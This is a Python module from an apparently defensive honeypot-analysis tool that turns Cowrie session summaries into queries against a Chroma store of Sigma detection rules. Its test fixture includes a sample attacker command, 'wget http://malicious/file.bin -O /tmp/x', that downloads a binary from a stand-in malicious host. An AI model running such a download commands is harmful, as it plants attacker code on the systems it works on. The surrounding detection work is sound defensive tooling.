## sigma_query.py
import os
from pathlib import Path

import chromadb
from chromadb.utils.embedding_functions import OpenAIEmbeddingFunction
from load_dotenv import load_dotenv

load_dotenv()


def get_sigma_collection(chroma_path="./data/chroma/sigma"):
    chroma_path = Path(chroma_path)

    api_key = os.getenv("OPENAI_API_KEY")
    if not api_key:
        raise RuntimeError("OPENAI_API_KEY environment variable is not set")

    client = chromadb.PersistentClient(path=str(chroma_path))

    embed_fn = OpenAIEmbeddingFunction(
        api_key=api_key,
        model_name="text-embedding-3-small",
    )

    collection = client.get_or_create_collection(
        name="sigma_rules",
        embedding_function=embed_fn,
    )
    return collection


def build_sigma_query_text(session_summary: dict) -> str:
    """
    Build a safe similarity-search query string for Sigma RAG embedding.
    Mirrors MITRE truncation behaviour to avoid token overflows.
    Stored session data remains unaffected.
    """

    MAX_SUMMARY_CHARS = 1200
    MAX_PORTS = 8
    MAX_COMMANDS = 8
    MAX_URLS = 8
    MAX_SIGNATURES = 8
    MAX_FILES = 8

    parts = []

    # Summary
    summary = session_summary.get("summary", "")
    if summary:
        parts.append(summary[:MAX_SUMMARY_CHARS])

    # Intent
    intent = session_summary.get("attack_intent")
    if intent:
        parts.append(f"Attack intent: {intent}")

    indicators = session_summary.get("key_indicators", {})

    # Simple fields
    if indicators.get("src_ip"):
        parts.append(f"Source IP: {indicators['src_ip']}")
    if indicators.get("dest_ip"):
        parts.append(f"Destination IP: {indicators['dest_ip']}")

    # Ports (truncate)
    src_ports = indicators.get("src_ports", [])
    if src_ports:
        parts.append("Source ports: " + ", ".join(map(str, src_ports[:MAX_PORTS])))

    dest_ports = indicators.get("dest_ports", [])
    if dest_ports:
        parts.append("Destination ports: " + ", ".join(map(str, dest_ports[:MAX_PORTS])))

    # Protocols
    prots = indicators.get("protocols", [])
    if prots:
        parts.append("Protocols: " + ", ".join(prots))

    # Commands (truncate)
    cmds = indicators.get("commands", [])
    for c in cmds[:MAX_COMMANDS]:
        parts.append("Command: " + str(c))

    # URLs (truncate)
    urls = indicators.get("urls", [])
    for u in urls[:MAX_URLS]:
        parts.append("URL: " + u)

    # Suricata signatures (truncate)
    sigs = indicators.get("signatures", [])
    for s in sigs[:MAX_SIGNATURES]:
        parts.append("Signature: " + str(s))

    # Files (truncate)
    files = indicators.get("files", [])
    for f in files[:MAX_FILES]:
        parts.append("File: " + str(f))

    # Time range
    ts = session_summary.get("timestamp_range", {})
    start_ts = ts.get("start")
    end_ts = ts.get("end")
    if start_ts or end_ts:
        parts.append(f"Time range: {start_ts} → {end_ts}")

    if not parts:
        return "Empty session summary"

    return "\n".join(parts)




def query_sigma_for_session(session_summary, top_k=5, chroma_path="./data/chroma/sigma"):
    collection = get_sigma_collection(chroma_path=chroma_path)
    query_text = build_sigma_query_text(session_summary)

    result = collection.query(
        query_texts=[query_text],
        n_results=top_k,
    )

    ids_list = result.get("ids", [[]])[0]
    metas_list = result.get("metadatas", [[]])[0]
    distances_list = result.get("distances", [[]])[0]

    matches = []
    for i in range(len(ids_list)):
        meta = metas_list[i] or {}
        distance = distances_list[i] if i < len(distances_list) else None

        matches.append({
            "sid": meta.get("sid"),
            "title": meta.get("title"),
            "logsource_product": meta.get("logsource_product"),
            "logsource_service": meta.get("logsource_service"),
            "level": meta.get("level"),
            "mitre_techniques": meta.get("mitre_techniques"),
            "raw_tags": meta.get("raw_tags"),
            "distance": distance,
        })

    return matches


def enrich_session_with_sigma(session_summary, top_k=5, chroma_path="./data/chroma/sigma"):
    sigma_candidates = query_sigma_for_session(
        session_summary,
        top_k=top_k,
        chroma_path=chroma_path,
    )
    session_summary["sigma_candidates"] = sigma_candidates
    return session_summary


if __name__ == "__main__":
    test = {
        "session_id": "x",
        "sensor": "Cowrie",
        "attack_intent": "malware_drop",
        "summary": "Attacker downloaded a suspicious ELF binary via wget.",
        "key_indicators": {
            "src_ip": "1.2.3.4",
            "dest_ip": "10.20.20.10",
            "src_ports": [44444],
            "dest_ports": [22],
            "protocols": ["ssh"],
            "commands": ["wget http://malicious/file.bin -O /tmp/x"],
            "urls": ["http://malicious/file.bin"],
            "signatures": [],
            "files": ["/tmp/x"],
        },
        "confidence": 0.9,
        "risk_score": 7,
        "timestamp_range": {"start": "2025-09-01", "end": "2025-09-01"}
    }

    enriched = enrich_session_with_sigma(test, top_k=5)
    print("Sigma candidates:")
    for c in enriched.get("sigma_candidates", []):
        print(c)
